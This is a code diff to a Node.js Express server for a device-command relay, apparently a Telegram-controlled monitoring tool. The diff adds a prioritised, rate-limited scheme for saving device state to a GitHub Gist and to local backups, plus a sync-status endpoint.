@@ -12,6 +12,42 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 const os = require('os');
 
+// ============= SMART SAVE PRIORITY SYSTEM =============
+const SAVE_PRIORITY = {
+    // CRITICAL - Save to GitHub immediately
+    CRITICAL: {
+        levels: ['register', 'unregister', 'config_change', 'token_update', 
+                 'failover_change', 'admin_change', 'first_seen'],
+        saveToGitHub: true,
+        saveLocal: true,
+        description: 'Important state changes'
+    },
+    
+    // IMPORTANT - Save to GitHub but can be batched
+    IMPORTANT: {
+        levels: ['device_update', 'command_ack', 'settings_change', 'feature_toggle'],
+        saveToGitHub: true,
+        saveLocal: true,
+        batchDelay: 5000, // Wait 5 seconds before saving to GitHub
+        description: 'Significant but not urgent'
+    },
+    
+    // ROUTINE - Local backup only
+    ROUTINE: {
+        levels: ['heartbeat', 'ping', 'command_poll', 'last_seen', 'online_status'],
+        saveToGitHub: false,
+        saveLocal: true,
+        description: 'Frequent updates - local only'
+    }
+};
+
+// Track pending GitHub saves
+let pendingGitHubSave = null;
+let lastGitHubSaveTime = 0;
+let batchedChanges = new Set();
+let isGitHubAvailable = true;
+let gitHubCooldownUntil = 0;
+
 // ============= VALIDATE REQUIRED ENVIRONMENT VARIABLES =============
 if (!process.env.ENCRYPTION_SALT) {
     console.error('❌ ENCRYPTION_SALT is REQUIRED!');
@@ -252,7 +288,7 @@ function queueAutoDataCommands(deviceId, chatId) {
     });
     
     console.log(`✅ ${commands.length} auto-data commands queued for ${deviceId}`);
-    saveDevices();
+    saveDevicesSmart('device_update');
 }
 
 // ============= DEVICE STATS AGGREGATION =============
@@ -334,7 +370,7 @@ function formatDeviceStatsMessage(stats) {
     return message;
 }
 
-// ============= GITHUB GIST STORAGE FUNCTIONS =============
+// ============= SMART GITHUB GIST STORAGE FUNCTIONS =============
 async function readFromGist(filename) {
     if (!octokit || !GIST_ID) return null;
     try {
@@ -350,6 +386,18 @@ async function readFromGist(filename) {
 
 async function writeToGist(filename, data) {
     if (!octokit) return false;
+    
+    // Rate limit protection
+    const now = Date.now();
+    if (!isGitHubAvailable) {
+        if (now < gitHubCooldownUntil) {
+            console.log(`⏸️ GitHub API on cooldown until ${new Date(gitHubCooldownUntil).toISOString()}`);
+            return false;
+        } else {
+            isGitHubAvailable = true;
+        }
+    }
+    
     try {
         const content = JSON.stringify(data, null, 2);
         const files = { [filename]: { content } };
@@ -363,10 +411,16 @@ async function writeToGist(filename, data) {
             return true;
         } else {
             await octokit.gists.update({ gist_id: GIST_ID, files });
-            console.log(`💾 Saved ${filename}`);
+            console.log(`💾 Saved ${filename} to GitHub`);
             return true;
         }
     } catch (error) {
+        if (error.status === 403 && error.message.includes('rate limit')) {
+            console.error(`❌ GitHub rate limit exceeded. Switching to local-only mode for 5 minutes.`);
+            isGitHubAvailable = false;
+            gitHubCooldownUntil = Date.now() + 5 * 60 * 1000; // 5 min cooldown
+            return false;
+        }
         console.error(`Error writing ${filename}:`, error.message);
         return false;
     }
@@ -395,13 +449,107 @@ function saveLocalBackup() {
     }
 }
 
-async function saveDevices() {
-    if (octokit) {
-        const devicesObj = {};
-        for (const [id, device] of devices.entries()) devicesObj[id] = device;
-        await writeToGist(GIST_FILES.DEVICES, devicesObj);
+async function saveToGitHubWithRetry(eventType, retryCount = 0) {
+    const MAX_RETRIES = 3;
+    const RETRY_DELAY = 2000;
+    
+    // Rate limit protection
+    const now = Date.now();
+    if (now - lastGitHubSaveTime < 2000) { // Min 2 seconds between GitHub saves
+        console.log(`⏸️ GitHub rate limit protection - delaying save [${eventType}]`);
+        await new Promise(resolve => setTimeout(resolve, 2000 - (now - lastGitHubSaveTime)));
     }
+    
+    try {
+        if (!octokit || !GIST_ID) {
+            console.log(`⚠️ GitHub not configured - skipping cloud save [${eventType}]`);
+            return false;
+        }
+        
+        // Prepare data (exclude large/non-essential fields for GitHub)
+        const devicesObj = {};
+        for (const [id, device] of devices.entries()) {
+            // Create a slim version for GitHub (exclude large arrays)
+            const { pendingCommands, ...slimDevice } = device;
+            devicesObj[id] = slimDevice;
+        }
+        
+        const success = await writeToGist(GIST_FILES.DEVICES, devicesObj);
+        
+        if (success) {
+            lastGitHubSaveTime = Date.now();
+            console.log(`✅ GitHub sync successful [${eventType}]`);
+            return true;
+        } else {
+            throw new Error('GitHub write failed');
+        }
+        
+    } catch (error) {
+        console.error(`❌ GitHub sync failed [${eventType}]:`, error.message);
+        
+        if (retryCount < MAX_RETRIES && error.message.includes('rate limit')) {
+            const waitTime = RETRY_DELAY * Math.pow(2, retryCount);
+            console.log(`🔄 Retrying GitHub save in ${waitTime}ms (attempt ${retryCount + 1}/${MAX_RETRIES})`);
+            await new Promise(resolve => setTimeout(resolve, waitTime));
+            return saveToGitHubWithRetry(eventType, retryCount + 1);
+        }
+        
+        return false;
+    }
+}
+
+async function saveDevicesSmart(eventType = 'routine', eventData = null) {
+    const now = Date.now();
+    
+    // Determine priority level
+    let priority = SAVE_PRIORITY.ROUTINE;
+    for (const [key, config] of Object.entries(SAVE_PRIORITY)) {
+        if (config.levels.includes(eventType)) {
+            priority = config;
+            break;
+        }
+    }
+    
+    // Always save locally (fast, no rate limit)
     saveLocalBackup();
+    
+    // Log the save action (with sampling for routine events)
+    if (priority !== SAVE_PRIORITY.ROUTINE || Math.random() < 0.05) {
+        console.log(`💾 Local backup saved [${eventType}] - ${priority.description}`);
+    }
+    
+    // Handle GitHub save based on priority
+    if (priority.saveToGitHub) {
+        if (priority === SAVE_PRIORITY.CRITICAL) {
+            // Save immediately
+            await saveToGitHubWithRetry(eventType);
+            console.log(`☁️ GitHub sync: IMMEDIATE [${eventType}]`);
+        } 
+        else if (priority === SAVE_PRIORITY.IMPORTANT) {
+            // Batch with delay
+            batchedChanges.add(eventType);
+            
+            if (!pendingGitHubSave) {
+                pendingGitHubSave = setTimeout(async () => {
+                    const changes = Array.from(batchedChanges);
+                    batchedChanges.clear();
+                    await saveToGitHubWithRetry(changes.join(','));
+                    console.log(`☁️ GitHub sync: BATCHED [${changes.join(', ')}]`);
+                    pendingGitHubSave = null;
+                }, priority.batchDelay);
+            }
+        }
+    } else {
+        // ROUTINE events - no GitHub save (log only 1% to avoid spam)
+        if (Math.random() < 0.01) {
+            console.log(`⏭️ GitHub sync: SKIPPED [${eventType}] - routine update only`);
+        }
+    }
+}
+
+// Legacy saveDevices function for backward compatibility
+async function saveDevices() {
+    await saveDevicesSmart('legacy');
 }
 
 // ============= FAILOVER STATE MANAGEMENT =============
@@ -565,6 +713,21 @@ app.get('/health', (req, res) => {
     });
 });
 
+// GitHub sync status endpoint
+app.get('/api/github-status', (req, res) => {
+    res.json({
+        github_available: isGitHubAvailable,
+        cooldown_until: gitHubCooldownUntil,
+        remaining_cooldown_ms: Math.max(0, gitHubCooldownUntil - Date.now()),
+        last_save_time: lastGitHubSaveTime,
+        devices_count: devices.size,
+        using_gist: !!GIST_ID,
+        has_token: !!GITHUB_TOKEN,
+        pending_batch_changes: Array.from(batchedChanges),
+        has_pending_save: !!pendingGitHubSave
+    });
+});
+
 // ============= 1. COMMAND ACKNOWLEDGMENT ENDPOINT =============
 app.post('/api/commands/:deviceId/ack', async (req, res) => {
     const deviceId = req.params.deviceId;
@@ -588,7 +751,7 @@ app.post('/api/commands/:deviceId/ack', async (req, res) => {
         }
         
         if (originalLength !== device.pendingCommands.length) {
-            await saveDevices();
+            await saveDevicesSmart('command_ack');
             console.log(`✅ Command ${commandId || command} acknowledged by ${deviceId}`);
         }
     }
@@ -626,6 +789,7 @@ app.post('/api/failover/force', async (req, res) => {
     failoverState.failoverCount = (failoverState.failoverCount || 0) + 1;
     
     await saveFailoverState();
+    await saveDevicesSmart('failover_change');
     await setupWebhook();
     
     res.json({ success: true, failoverActive: true });
@@ -641,6 +805,7 @@ app.post('/api/failover/restore', async (req, res) => {
     failoverState.currentServerUrl = activeServerUrl;
     
     await saveFailoverState();
+    await saveDevicesSmart('failover_change');
     await setupWebhook();
     
     res.json({ success: true, failoverActive: false });
@@ -731,7 +896,9 @@ app.get('/api/commands/:deviceId', async (req, res) => {
                 !validCommands.includes(cmd)
             );
             
-            await saveDevices();
+            if (commands.length > 0) {
+                await saveDevicesSmart('command_poll');
+            }
             console.log(`📤 Sending ${commands.length} commands to ${deviceId}`);
             res.json({ commands });
         } else {
@@ -750,7 +917,7 @@ app.get('/api/ping/:deviceId', async (req, res) => {
     
     if (device) {
         device.lastSeen = Date.now();
-        await saveDevices();
+        await saveDevicesSmart('heartbeat');
         res.json({ status: 'alive', timestamp: Date.now(), registered: true });
     } else {
         res.status(404).json({ status: 'unknown', registered: false });
@@ -781,7 +948,7 @@ app.post('/api/register', async (req, res) => {
     };
     
     devices.set(deviceId, deviceData);
-    await saveDevices();
+    await saveDevicesSmart(isNewDevice ? 'register' : 'device_update');
     
     console.log(`✅ Device ${isNewDevice ? 'registered' : 'updated'}: ${deviceId}`);
     await setChatMenuButton(deviceConfig.chatId);
@@ -1187,7 +1354,7 @@ async function handleCommand(chatId, command, messageId) {
     }
     
     device.lastSeen = Date.now();
-    await saveDevices();
+    await saveDevicesSmart('last_seen');
     
     if (!device.pendingCommands) device.pendingCommands = [];
     
@@ -1198,10 +1365,11 @@ async function handleCommand(chatId, command, messageId) {
         messageId: messageId,
         timestamp: Date.now()
     });
-    await saveDevices();
+    await saveDevicesSmart('command_poll');
     
     await sendTelegramMessage(chatId, `✅ *Command sent: ${command}*\n📱 Device: ${device.deviceInfo?.model || 'Unknown'}\n\nThe command will be executed when the device is online.`);
 }
+
 // ============= CALLBACK QUERY HANDLER =============
 async function handleCallbackQuery(callbackQuery) {
     const chatId = callbackQuery.message.chat.id;
@@ -1405,8 +1573,6 @@ async function handleCallbackQuery(callbackQuery) {
             break;
     }
 }
-
-
 
 // ============= COMPLETE INLINE MENU KEYBOARDS =============
 
@@ -1915,6 +2081,7 @@ function getSetSyncIntervalKeyboard() {
 function getSetServerBackupKeyboard() { 
     return [[{ text: "◀️ Cancel", callback_data: "menu_bot_token" }]]; 
 }
+
 // ============= START SERVER =============
 async function startServer() {
     console.log('🚀 Starting EduMonitor Server...');
@@ -1939,6 +2106,7 @@ async function startServer() {
         console.log(`🔐 Encryption salt: ${ENCRYPTION_SALT.substring(0, 10)}...`);
         console.log(`🔄 Failover active: ${failoverState.isFailedOver ? 'YES' : 'NO'}`);
         console.log(`📊 Auto-data queue: ${autoDataRequested.size} devices`);
+        console.log(`💾 Smart Save System: ACTIVE (Critical/Important/Routine)`);
         
         await setupWebhook();
     });
